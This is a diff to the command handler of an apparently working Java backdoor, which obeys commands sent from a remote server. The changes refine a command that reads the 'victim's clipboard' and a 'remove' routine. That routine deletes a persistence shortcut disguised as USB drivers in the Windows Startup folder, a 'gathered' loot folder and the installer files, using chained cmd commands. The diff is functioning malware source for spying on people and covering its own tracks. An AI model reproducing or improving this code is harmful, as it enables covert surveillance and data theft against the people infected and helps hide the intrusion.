@@ -22,7 +22,7 @@ public class HandleCommand {
 	 * response. {@link Backdoor.out} is then used to send response followed by a
 	 * token to signal end of response.
 	 *
-	 * @param command command given to backdoor from server.
+	 * @param command command given to backdoor from server
 	 */
 	public static void handle(String command) {
 		String send = "";
@@ -95,7 +95,10 @@ public class HandleCommand {
 		else if (command.equals("cb"))
 			try {
 				String cb = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
-				send = "Victim's clipboard:\n" + cb;
+				if (cb.isEmpty())
+					send = "Nothing copied to victim's clipboard";
+				else
+					send = "Victim's clipboard:\n" + cb;
 			} catch (Exception e) {
 				send = "An error occurred when trying to get victim's clipboard:\n" + e.getMessage();
 			}
@@ -110,31 +113,17 @@ public class HandleCommand {
 			}
 		} else if (command.equals("remove")) {
 			try {
-				if (new File("gathered").exists())
-					FileUtils.forceDelete(new File("gathered"));
-				if (new File("jre").exists())
-					FileUtils.forceDelete(new File("jre"));
-				if (new File("scripts").exists())
-					FileUtils.forceDelete(new File("scripts"));
-
-				if (new File("USBDrivers.vbs").exists())
-					FileUtils.forceDelete(new File("USBDrivers.vbs"));
 				if (new File("C:\\Users\\" + System.getProperty("user.name")
 						+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk")
 								.exists())
 					FileUtils.forceDelete(new File("C:\\Users\\" + System.getProperty("user.name")
 							+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk"));
 				if (new File("USBDrivers.jar").exists())
-					Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f USBDrivers.jar");
-
-				if (new File("install.bat").exists())
-					FileUtils.forceDelete(new File("install.bat"));
-				if (new File("install.jar").exists())
-					FileUtils.forceDelete(new File("install.jar"));
-				if (new File("run.bat").exists())
-					FileUtils.forceDelete(new File("run.bat"));
+					Runtime.getRuntime().exec(
+							"cmd /c ping localhost -n 5 > nul && del /f /q USBDrivers.jar USBDrivers.vbs && rd /s /q gathered jre scripts && cd.. && rd /s /q USBDrivers");
 				if (new File("run.jar").exists())
-					Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f run.jar");
+					Runtime.getRuntime().exec(
+							"cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat install.jar install.bat && rd /s /q gathered jre scripts");
 				System.exit(0);
 			} catch (Exception e) {
 				send = "An error occurred when trying to remove files:\n" + e.getMessage();
